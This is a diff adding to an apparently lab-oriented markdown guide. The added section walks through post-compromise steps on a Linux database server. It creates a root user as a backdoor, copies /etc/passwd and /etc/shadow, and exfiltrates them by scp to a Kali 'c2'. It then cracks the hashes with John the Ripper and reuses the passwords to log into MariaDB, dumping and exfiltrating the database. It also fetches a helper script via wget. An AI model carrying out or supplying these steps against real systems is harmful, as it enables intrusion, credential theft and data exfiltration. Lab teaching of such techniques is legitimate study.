@@ -173,6 +173,8 @@ sudo passwd
 ```
 
 Switch user and Check priv
+
+e.g
 ```
 su - dany_Admin
 sudo apt update
@@ -201,4 +203,78 @@ or
 ```
 echo "dany_Admin ALL=(ALL:ALL) ALL" > /etc/sudoers
 ```
+Check to make sure ssh with password is enabled (`cat /etc/ssh/sshd.config`) or create a new user with root privillege  | <= backdoor in the system => 
+
+With the new user with root access, dumb the /etc/passwd and /etc/shadow . This will be used to crack the password with John the ripper
+```
+sudo cp /etc/passwd /etc/shadow .
+```
+
+Exfiltrate to your c2, Kali in this demo, or the file server with scp
+
+## On Kali
+
+Create a dir where u will dump all files exfiltrated `mkir goubun`
+
+chech what encryption type was used to hash passwords in shadow. You can do that by lookin what is in between $$. $6$ for example is sha512
+
+Now unhadow passwd + shadow with John and dump in a file named ops
+
+```
+unshadow passwd shadow > ops
+
+```
+Now crack the pass with a dictionnary attack. Make sure you have the file words (million.txt) in the current dir or put the right location
+
+```
+john ops --format=sha512crypt --wordlist=million.txt
+
+```
+
+You should see the passwords cracked.
+
+Could also do `john --show ops` to see the pass as well
+
+
+
+
+Get back on the db server
+
+Do: ps aux | grep mysql
+
+Do: ps aux | grep nginx
+
+Do: ps aux | grep mariadb
+
+This is to confirm it is running a db and web server as their services will be running
+
+
+## Database dump
+ Now that you have your confirmation,
+
+try different users & passwords you cracked to try to get access to mariadb. Hopefully, one admin used the same password used to access the server and the db
+
+```
+mysql -u blababla (whatever user) -p
+```
+
+One should work
+
+Once you have acces to the db, 
+
+```
+show databases;
+show table => use users; => describe users;
+SELECT * FROM users; (to show the entire users table)
+```
+
+exit mariadb
+
+dump the entire db with ` mysqldump -u my_user -p nwit291 > nwit291_dump.sql` then exfiltrate it to your c2 (kali)
+
+Could also use a script user_search.py (import from the file server) => wget https://prometheus.kevin..../user_search.py
+
+
+
+
 
